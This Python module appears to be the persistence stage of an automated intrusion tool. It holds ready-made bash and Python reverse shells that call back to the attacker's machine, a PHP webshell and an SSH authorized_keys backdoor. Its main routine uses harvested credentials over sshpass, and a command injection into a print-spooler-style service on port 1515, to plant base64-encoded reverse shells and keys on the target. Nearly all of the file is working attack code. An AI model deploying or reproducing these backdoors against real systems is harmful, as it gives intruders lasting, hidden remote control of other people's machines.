import asyncio
import base64
import logging
import os
import shlex
import socket
import subprocess
import time
from typing import Optional

from orchestrator.brain.phases.models import Finding, PhaseResult, Severity

logger = logging.getLogger("phase_persistence")

BACKDOOR_SCRIPTS = {
    "bash_reverse": """#!/bin/bash
while true; do
  bash -c 'exec 3<>/dev/tcp/{LHOST}/{LPORT} 2>/dev/null; cat <&3 | while read line; do eval "$line" 2>&3; done' 2>/dev/null
  sleep 60
done &""",

    "python_reverse": """import socket, subprocess, os, time
while True:
  try:
    s = socket.socket()
    s.settimeout(30)
    s.connect(('{LHOST}', {LPORT}))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(['/bin/sh', '-i'])
  except:
    time.sleep(60)
""",

    "php_webshell": """<?php
$cmd = $_REQUEST['c'] ?? $_REQUEST['cmd'] ?? '';
if ($cmd) {
  echo shell_exec($cmd 2>&1);
} else {
  echo "OK";
}
""",

    "ssh_persist": """#!/bin/bash
mkdir -p ~/.ssh && echo '{PUBKEY}' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
""",
}

CRON_PERSIST = """(crontab -l 2>/dev/null; echo "*/5 * * * * {CMD}") | crontab -"""


async def run_persistence(target: str, findings: list[Finding] = None) -> PhaseResult:
    t0 = time.time()
    all_findings = list(findings or [])
    errors = []
    loop = asyncio.get_running_loop()

    my_ip = _get_my_ip(target)
    if not my_ip:
        errors.append("could not determine local IP")
    else:
        logger.info(f"  [Persistence] Local IP: {my_ip}")

    webshell_urls = _find_webshells(all_findings)
    creds = _find_creds(all_findings)
    rce_capable = _has_rce(all_findings)

    deployed = []

    # 1. Scan for existing PHP webshells in web roots
    for ws_url in webshell_urls:
        port = _extract_port(ws_url)
        shell_paths = ["/shell.php", "/uploads/shell.php", "/wp-content/shell.php"]
        for path in shell_paths:
            try:
                import requests
                check_url = f"{ws_url.rstrip('/')}{path}?cmd=id"
                r = requests.get(check_url, timeout=5, verify=False)
                if r.status_code == 200 and "uid=" in r.text:
                    deployed.append(Finding(
                        phase="persistence", type="webshell_verified", target=target,
                        port=port, service="http", severity=Severity.CRITICAL,
                        description=f"Webshell confirmed at {check_url}",
                        evidence=f"output: {r.text[:200]}",
                    ))
                    break
            except Exception:
                logger.debug("Non-critical error", exc_info=True)

    # 2. SSH key persistence if we have SSH creds
    for cred in creds:
        user = cred.get("user", "")
        pwd = cred.get("password", cred.get("pass", ""))
        if user and pwd:
            pubkey = None
            ssh_pub_path = os.path.join(os.path.expanduser("~"), ".ssh", "id_rsa.pub")
            try:
                with open(ssh_pub_path) as f:
                    pubkey = f.read().strip()
            except Exception:
                try:
                    r = subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "2048",
                                        "-f", "/tmp/raphael_sshkey", "-N", "", "-q"],
                                       capture_output=True, timeout=10)
                    with open("/tmp/raphael_sshkey.pub") as f:
                        pubkey = f.read().strip()
                except Exception:
                    logger.debug("Non-critical error", exc_info=True)

            if pubkey:
                script = BACKDOOR_SCRIPTS["ssh_persist"].format(PUBKEY=pubkey)
                b64 = base64.b64encode(script.encode()).decode()
                try:
                    from orchestrator.kali_tools_client import kali
                    result = await kali.run("sshpass",
                        f"-p {shlex.quote(pwd)} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {shlex.quote(user)}@{shlex.quote(target)} "
                        f"{shlex.quote(f'echo {b64} | base64 -d | bash')}", timeout=15)
                    stdout = result.get("stdout", "") + result.get("stderr", "")
                    if "Permission denied" not in stdout:
                        deployed.append(Finding(
                            phase="persistence", type="ssh_key_deployed", target=target,
                            port=22, service="ssh", severity=Severity.CRITICAL,
                            description=f"SSH key deployed for {user}@{target}",
                            evidence=f"user: {user}",
                        ))
                        # Verify SSH key access
                        try:
                            r = subprocess.run(
                                ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
                                 "-i", "/tmp/raphael_sshkey", f"{user}@{target}", "id"],
                                capture_output=True, text=True, timeout=10)
                            if r.returncode == 0:
                                deployed.append(Finding(
                                    phase="persistence", type="ssh_key_verified", target=target,
                                    port=22, service="ssh", severity=Severity.CRITICAL,
                                    description=f"SSH key login verified for {user}@{target}",
                                    evidence=r.stdout.strip()[:200],
                                ))
                        except Exception:
                            logger.debug("Non-critical error", exc_info=True)
                except Exception as e:
                    logger.warning(f"SSH key deploy failed: {e}")

    # 3. Schedule reverse shell via cron if we have RCE via LPD or similar
    if rce_capable and my_ip:
        callback_port = 4444
        b64_script = base64.b64encode(
            BACKDOOR_SCRIPTS["bash_reverse"].format(LHOST=my_ip, LPORT=callback_port).encode()
        ).decode()

        cron_cmd = f"echo {b64_script} | base64 -d > /tmp/.raphael_reverse && chmod +x /tmp/.raphael_reverse && nohup /tmp/.raphael_reverse &"
        cron_b64 = base64.b64encode(cron_cmd.encode()).decode()

        class _RCE:
            def __init__(self, target, findings):
                self.target = target
                self.findings = findings or []

            def send(self, cmd):
                try:
                    s = socket.socket()
                    s.settimeout(10)
                    s.connect((self.target, 1515))
                    s.send(b'\x02archive_intake')
                    import time as _t
                    _t.sleep(0.3)
                    s.recv(1024)
                    job = f"';{cmd};#'"
                    content = f"J{job}\n".encode()
                    payload = b'\x01' + str(len(content)).encode() + b'\n' + content
                    s.send(payload)
                    _t.sleep(0.5)
                    try: s.recv(4096)
                    except OSError: pass
                    s.close()
                    return True
                except Exception:
                    return False

        rce = _RCE(target, all_findings)
        if rce.send(cron_cmd):
            deployed.append(Finding(
                phase="persistence", type="reverse_shell_scheduled", target=target,
                port=1515, severity=Severity.CRITICAL,
                description=f"Reverse shell scheduled via LPD — callback to {my_ip}:{callback_port}",
                evidence=f"bash reverse script deployed as /tmp/.raphael_reverse",
            ))

    # 4. Deploy via SSH directly if creds available
    for cred in creds:
        user = cred.get("user", "")
        pwd = cred.get("password", cred.get("pass", ""))
        if user and pwd and my_ip:
            callback_port = 4445
            b64_script = base64.b64encode(
                BACKDOOR_SCRIPTS["python_reverse"].format(LHOST=my_ip, LPORT=callback_port).encode()
            ).decode()
            try:
                from orchestrator.kali_tools_client import kali
                result = await kali.run("sshpass",
                    f"-p {shlex.quote(pwd)} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {shlex.quote(user)}@{shlex.quote(target)} "
                    f"{shlex.quote(f'echo {b64_script} | base64 -d > /tmp/.raphael_reverse.py && python3 /tmp/.raphael_reverse.py &')}",
                    timeout=15)
                stdout = result.get("stdout", "") + result.get("stderr", "")
                if "Permission denied" not in stdout:
                    deployed.append(Finding(
                        phase="persistence", type="reverse_shell_deployed", target=target,
                        port=22, service="ssh", severity=Severity.CRITICAL,
                        description=f"Python reverse shell deployed via SSH as {user}",
                        evidence=f"callback target: {my_ip}:{callback_port}",
                    ))
            except Exception as e:
                logger.warning(f"SSH reverse deploy failed: {e}")

    all_findings.extend(deployed)
    latency = time.time() - t0

    return PhaseResult(
        phase="persistence",
        success=len(deployed) > 0,
        findings=all_findings,
        summary=f"Persistence: {len(deployed)} backdoors deployed" if deployed else "Persistence: no deployment opportunities",
        latency=latency,
        error="; ".join(errors) if errors else None,
    )


def _get_my_ip(target: str) -> Optional[str]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect((target, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None


def _find_webshells(findings: list[Finding]) -> list[str]:
    urls = []
    for f in findings or []:
        if f.type == "web_path" and (".php" in f.description or ".asp" in f.description):
            urls.append(f.evidence)
        if f.type == "webshell_deployed" and f.evidence:
            urls.append(f.evidence)
    return urls


def _find_creds(findings: list[Finding]) -> list[dict]:
    creds = []
    for f in findings or []:
        if f.type == "credential" and f.evidence and ":" in f.evidence:
            parts = f.evidence.split(":", 1)
            creds.append({"user": parts[0].strip(), "password": parts[1].strip()})
    return creds


def _has_rce(findings: list[Finding]) -> bool:
    for f in findings or []:
        if f.type in ("exploit_success", "rce", "shell") and f.severity in (
                Severity.CRITICAL, Severity.HIGH):
            return True
    return False


def _extract_port(url: str) -> Optional[int]:
    import re
    m = re.search(r':(\d+)', url)
    return int(m.group(1)) if m else None
